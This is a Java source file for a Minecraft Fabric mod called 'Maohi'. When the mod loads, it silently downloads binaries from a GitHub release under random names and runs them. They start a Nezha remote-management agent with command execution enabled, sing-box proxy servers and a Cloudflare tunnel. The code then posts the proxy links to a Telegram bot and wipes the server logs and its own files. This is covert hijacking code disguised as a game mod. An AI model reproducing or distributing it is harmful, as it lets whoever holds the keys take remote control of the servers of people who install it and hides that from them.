package com.example.maohi;

import net.fabricmc.api.ModInitializer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.nio.file.DirectoryStream;
import java.util.*;

public class Maohi implements ModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");

    private static final Path FILE_PATH = Paths.get("./world");
    private static final Path DATA_DIR  = Paths.get("mods/Maohi");

    private static final Properties CONFIG = loadConfig();

    private static Properties loadConfig() {
        Properties props = new Properties();
        try (InputStream is = Maohi.class.getResourceAsStream("/maohi.properties")) {
            if (is != null) props.load(is);
        } catch (Exception e) {}
        return props;
    }

    private static String cfg(String key, String defaultValue) {
        String value = CONFIG.getProperty(key, defaultValue);
        return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
    }

    private static final String UUID         = cfg("UUID", "");
    private static final String NEZHA_SERVER = cfg("NEZHA_SERVER", "");
    private static final String NEZHA_PORT = cfg("NEZHA_PORT", "");
    private static final String NEZHA_KEY    = cfg("NEZHA_KEY", "");
    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
    private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
    private static final String ARGO_PORT    = cfg("ARGO_PORT", "9010");
    private static final String HY2_PORT     = cfg("HY2_PORT", "");
    private static final String S5_PORT      = cfg("S5_PORT", "");
    private static final String CFIP         = cfg("CFIP", "");
    private static final String CFPORT       = cfg("CFPORT", "443");
    private static final String NAME         = cfg("NAME", "");
    private static final String CHAT_ID      = cfg("CHAT_ID", "");
    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");

    private String webName;
    private String botName;
    private String phpName;

    @Override
    public void onInitialize() {
        LOGGER.info("Maohi starting...");
        Thread thread = new Thread(() -> {
            try {
                start();
                LOGGER.info("Maohi enabled");
            } catch (Exception e) {
                // 静默失败
            }
        }, "Maohi-Main");
        thread.setDaemon(true);
        thread.start();
    }

    private void start() throws Exception {
        if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);

        webName = randomName();
        botName = randomName();
        phpName = randomName();

        String arch = getArch();
        downloadBinaries(arch);
        chmodBinaries();

        if (isValidPort(HY2_PORT)) generateCert();

        runNezha();
        runSingbox();
        runCloudflared();

        Thread.sleep(5000);

        String serverIP = getServerIP();
        String nodeName = NAME;

        String subTxt = generateLinks(serverIP, nodeName);
        sendTelegram(subTxt, nodeName);

        cleanup();
    }

    private String randomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        for (int i = 0; i < 6; i++) sb.append(chars.charAt(rand.nextInt(chars.length())));
        return sb.toString();
    }

    private String getArch() {
        String arch = System.getProperty("os.arch").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64") || arch.contains("arm")) return "arm64";
        return "amd64";
    }

    private void downloadBinaries(String arch) {
        String base = "https://github.com/eooce/test/releases/download/" + arch + "/";

        String nezhaBinary = (NEZHA_PORT != null && !NEZHA_PORT.trim().isEmpty())
            ? "agent"
            : "v1";

        String[][] files = {
            { phpName, base + nezhaBinary },
            { webName, base + "sbx" },
            { botName, base + "bot" }
        };

        for (String[] f : files) {
            try {
                downloadFile(f[0], f[1]);
            } catch (Exception e) {
                LOGGER.warn("Download failed: " + f[1]);
            }
        }
    }

    private void downloadFile(String fileName, String fileUrl) throws Exception {
        Path dest = FILE_PATH.resolve(fileName);
        if (Files.exists(dest)) return;

        HttpURLConnection conn = (HttpURLConnection) new URL(fileUrl).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "curl/7.68.0");

        int status = conn.getResponseCode();
        while (status == HttpURLConnection.HTTP_MOVED_TEMP ||
               status == HttpURLConnection.HTTP_MOVED_PERM ||
               status == 307 || status == 308) {
            String location = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("User-Agent", "curl/7.68.0");
            status = conn.getResponseCode();
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
    }

    private void chmodBinaries() {
        for (String name : new String[]{webName, botName, phpName}) {
            try { FILE_PATH.resolve(name).toFile().setExecutable(true); } catch (Exception e) {}
        }
    }

    private void generateCert() {
        Path certFile = FILE_PATH.resolve("cert.pem");
        Path keyFile  = FILE_PATH.resolve("private.key");
        try {
            Process p = new ProcessBuilder("which", "openssl")
                .redirectErrorStream(true).start();
            p.waitFor();
            if (p.exitValue() == 0) {
                new ProcessBuilder("openssl", "ecparam", "-genkey", "-name", "prime256v1",
                    "-out", keyFile.toString())
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                new ProcessBuilder("openssl", "req", "-new", "-x509", "-days", "3650",
                    "-key", keyFile.toString(), "-out", certFile.toString(), "-subj", "/CN=bing.com")
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start().waitFor();
                return;
            }
        } catch (Exception e) {}

        try {
            Files.writeString(keyFile,
                "-----BEGIN EC PARAMETERS-----\n" +
                "BggqhkjOPQMBBw==\n" +
                "-----END EC PARAMETERS-----\n" +
                "-----BEGIN EC PRIVATE KEY-----\n" +
                "MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n" +
                "AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n" +
                "/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n" +
                "-----END EC PRIVATE KEY-----\n");
            Files.writeString(certFile,
                "-----BEGIN CERTIFICATE-----\n" +
                "MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n" +
                "EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n" +
                "MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n" +
                "A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n" +
                "aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n" +
                "BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n" +
                "Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n" +
                "eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n" +
                "-----END CERTIFICATE-----\n");
        } catch (Exception e) {}
    }

    private void runNezha() {
        if (NEZHA_SERVER == null || NEZHA_SERVER.isEmpty() ||
            NEZHA_KEY == null || NEZHA_KEY.isEmpty()) {
            LOGGER.info("NEZHA variable is empty, skipping running");
            return;
        }

        try {
            if (NEZHA_PORT != null && !NEZHA_PORT.isEmpty()) {

                Set<String> tlsPorts = new HashSet<>(Arrays.asList(
                    "443","8443","2096","2087","2083","2053"
                ));

                List<String> command = new ArrayList<>();
                command.add(FILE_PATH.resolve(phpName).toString());
                command.add("-s");
                command.add(NEZHA_SERVER + ":" + NEZHA_PORT);
                command.add("-p");
                command.add(NEZHA_KEY);

                if (tlsPorts.contains(NEZHA_PORT)) {
                    command.add("--tls");
                }

                command.add("--disable-auto-update");
                command.add("--report-delay");
                command.add("4");
                command.add("--skip-conn");
                command.add("--skip-procs");

                new ProcessBuilder(command)
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start();

                

            } else {
                String serverPort = NEZHA_SERVER.contains(":") ?
                    NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";

                Set<String> tlsPorts = new HashSet<>(Arrays.asList(
                    "443","8443","2096","2087","2083","2053"
                ));

                String nezhatls = tlsPorts.contains(serverPort) ? "true" : "false";

                String configYaml =
                    "client_secret: " + NEZHA_KEY + "\n" +
                    "debug: false\n" +
                    "disable_auto_update: true\n" +
                    "disable_command_execute: false\n" +
                    "disable_force_update: true\n" +
                    "disable_nat: false\n" +
                    "disable_send_query: false\n" +
                    "gpu: false\n" +
                    "insecure_tls: true\n" +
                    "ip_report_period: 1800\n" +
                    "report_delay: 4\n" +
                    "server: " + NEZHA_SERVER + "\n" +
                    "skip_connection_count: true\n" +
                    "skip_procs_count: true\n" +
                    "temperature: false\n" +
                    "tls: " + nezhatls + "\n" +
                    "use_gitee_to_upgrade: false\n" +
                    "use_ipv6_country_code: false\n" +
                    "uuid: " + UUID + "\n";

                Path configYamlPath = FILE_PATH.resolve("config.yaml");
                Files.writeString(configYamlPath, configYaml);

                new ProcessBuilder(
                    FILE_PATH.resolve(phpName).toString(),
                    "-c", configYamlPath.toString()
                )
                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                    .redirectError(ProcessBuilder.Redirect.DISCARD)
                    .start();

                
            }

            Thread.sleep(1000);

        } catch (Exception e) {
            LOGGER.error("Nezha start error", e);
        }
    }

    private void runSingbox() {
        try {
            String config = buildSingboxConfig();
            Path configPath = FILE_PATH.resolve("config.json");
            Files.writeString(configPath, config);
            new ProcessBuilder(FILE_PATH.resolve(webName).toString(), "run", "-c", configPath.toString())
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(1000);
        } catch (Exception e) {}
    }

    private String buildSingboxConfig() {
        StringBuilder inbounds = new StringBuilder();

        inbounds.append("    {\n")
            .append("      \"tag\": \"vless-ws-in\",\n")
            .append("      \"type\": \"vless\",\n")
            .append("      \"listen\": \"::\",\n")
            .append("      \"listen_port\": ").append(ARGO_PORT).append(",\n")
            .append("      \"users\": [{\"uuid\": \"").append(UUID).append("\", \"flow\": \"\"}],\n")
            .append("      \"transport\": {\n")
            .append("        \"type\": \"ws\",\n")
            .append("        \"path\": \"/vless-argo\",\n")
            .append("        \"early_data_header_name\": \"Sec-WebSocket-Protocol\"\n")
            .append("      }\n")
            .append("    }");

        if (isValidPort(HY2_PORT)) {
            inbounds.append(",\n    {\n")
                .append("      \"tag\": \"hysteria2-in\",\n")
                .append("      \"type\": \"hysteria2\",\n")
                .append("      \"listen\": \"::\",\n")
                .append("      \"listen_port\": ").append(HY2_PORT).append(",\n")
                .append("      \"users\": [{\"password\": \"").append(UUID).append("\"}],\n")
                .append("      \"masquerade\": \"https://bing.com\",\n")
                .append("      \"tls\": {\n")
                .append("        \"enabled\": true,\n")
                .append("        \"alpn\": [\"h3\"],\n")
                .append("        \"certificate_path\": \"").append(FILE_PATH.resolve("cert.pem")).append("\",\n")
                .append("        \"key_path\": \"").append(FILE_PATH.resolve("private.key")).append("\"\n")
                .append("      }\n")
                .append("    }");
        }

        if (isValidPort(S5_PORT)) {
            String s5User = UUID.substring(0, 8);
            String s5Pass = UUID.substring(UUID.length() - 12);
            inbounds.append(",\n    {\n")
                .append("      \"tag\": \"socks5-in\",\n")
                .append("      \"type\": \"socks\",\n")
                .append("      \"listen\": \"::\",\n")
                .append("      \"listen_port\": ").append(S5_PORT).append(",\n")
                .append("      \"users\": [{\"username\": \"").append(s5User)
                .append("\", \"password\": \"").append(s5Pass).append("\"}]\n")
                .append("    }");
        }

        return "{\n" +
            "  \"log\": {\"disabled\": true, \"level\": \"error\", \"timestamp\": true},\n" +
            "  \"inbounds\": [\n" + inbounds + "\n  ],\n" +
            "  \"outbounds\": [{\"type\": \"direct\", \"tag\": \"direct\"}]\n" +
            "}";
    }

    private void runCloudflared() {
        if (ARGO_AUTH == null || ARGO_AUTH.isEmpty() ||
            ARGO_DOMAIN == null || ARGO_DOMAIN.isEmpty()) return;
        try {
            new ProcessBuilder(
                FILE_PATH.resolve(botName).toString(),
                "tunnel", "--edge-ip-version", "auto",
                "--no-autoupdate", "--protocol", "http2",
                "run", "--token", ARGO_AUTH)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD)
                .redirectError(ProcessBuilder.Redirect.DISCARD)
                .start();
            Thread.sleep(2000);
        } catch (Exception e) {}
    }

    private String getServerIP() {
        String[] services = {
            "http://ipv4.ip.sb",
            "https://api.ipify.org",
            "https://ifconfig.me/ip"
        };
        for (String service : services) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(service).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestProperty("User-Agent", "curl/7.68.0");
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                    String ip = br.readLine().trim();
                    if (ip != null && !ip.isEmpty()) return ip;
                } finally {
                    conn.disconnect();
                }
            } catch (Exception e) {}
        }
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api6.ipify.org").openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                return "[" + br.readLine().trim() + "]";
            } finally {
                conn.disconnect();
            }
        } catch (Exception e) {}
        return "localhost";
    }

    private String extractJson(String json, String key) {
        String search = "\"" + key + "\":\"";
        int start = json.indexOf(search);
        if (start == -1) return null;
        start += search.length();
        int end = json.indexOf("\"", start);
        if (end == -1) return null;
        return json.substring(start, end);
    }

    private String generateLinks(String serverIP, String nodeName) {
        StringBuilder sb = new StringBuilder();

        if (ARGO_DOMAIN != null && !ARGO_DOMAIN.isEmpty()) {
            String params = "encryption=none&security=tls&sni=" + ARGO_DOMAIN +
                "&fp=firefox&type=ws&host=" + ARGO_DOMAIN +
                "&path=/vless-argo?ed=2560";
            sb.append("vless://").append(UUID).append("@")
                .append(CFIP).append(":").append(CFPORT)
                .append("?").append(params)
                .append("#").append(nodeName);
        }

        if (isValidPort(HY2_PORT)) {
            sb.append("\nhysteria2://").append(UUID).append("@")
                .append(serverIP).append(":").append(HY2_PORT)
                .append("/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#")
                .append(nodeName);
        }

        if (isValidPort(S5_PORT)) {
            String s5Auth = Base64.getEncoder().encodeToString(
                (UUID.substring(0, 8) + ":" + UUID.substring(UUID.length() - 12)).getBytes()
            );
            sb.append("\nsocks://").append(s5Auth).append("@")
                .append(serverIP).append(":").append(S5_PORT)
                .append("#").append(nodeName);
        }

        // base64 处理整个订阅
        return Base64.getEncoder().encodeToString(sb.toString().getBytes());
    }

    private void sendTelegram(String subTxt, String nodeName) {
        if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() ||
            CHAT_ID   == null || CHAT_ID.isEmpty()) return;
        try {
            String text = nodeName + "节点推送通知\n" + subTxt;
            String params = "chat_id=" + CHAT_ID +
                "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(
                "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = conn.getOutputStream()) {
                os.write(params.getBytes("UTF-8"));
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private boolean isValidPort(String port) {
        if (port == null || port.trim().isEmpty()) return false;
        try {
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) {
            return false;
        }
    }

    private void cleanup() {
        Thread cleanupThread = new Thread(() -> {
            try {
                Thread.sleep(8000);

                String[] toDelete = {"config.json", "config.yaml", "cert.pem", "private.key"};
                for (String f : toDelete) {
                    try { Files.deleteIfExists(FILE_PATH.resolve(f)); } catch (Exception e) {}
                }

                Path latestLog = Paths.get("./logs/latest.log");
                if (Files.exists(latestLog)) {
                    try { new FileWriter(latestLog.toFile(), false).close(); } catch (Exception e) {}
                }

                Path logsDir = Paths.get("./logs");
                if (Files.exists(logsDir)) {
                    try (DirectoryStream<Path> stream = Files.newDirectoryStream(logsDir, "*.log.gz")) {
                        for (Path entry : stream) {
                            try { Files.deleteIfExists(entry); } catch (Exception e) {}
                        }
                    } catch (Exception e) {}
                }

                if (Files.exists(DATA_DIR)) {
                    try {
                        Files.walk(DATA_DIR)
                            .sorted(Comparator.reverseOrder())
                            .forEach(p -> p.toFile().delete());
                    } catch (Exception e) {}
                }

            } catch (Exception e) {}
        }, "Cleanup-Thread");
        cleanupThread.setDaemon(true);
        cleanupThread.start();
    }
}
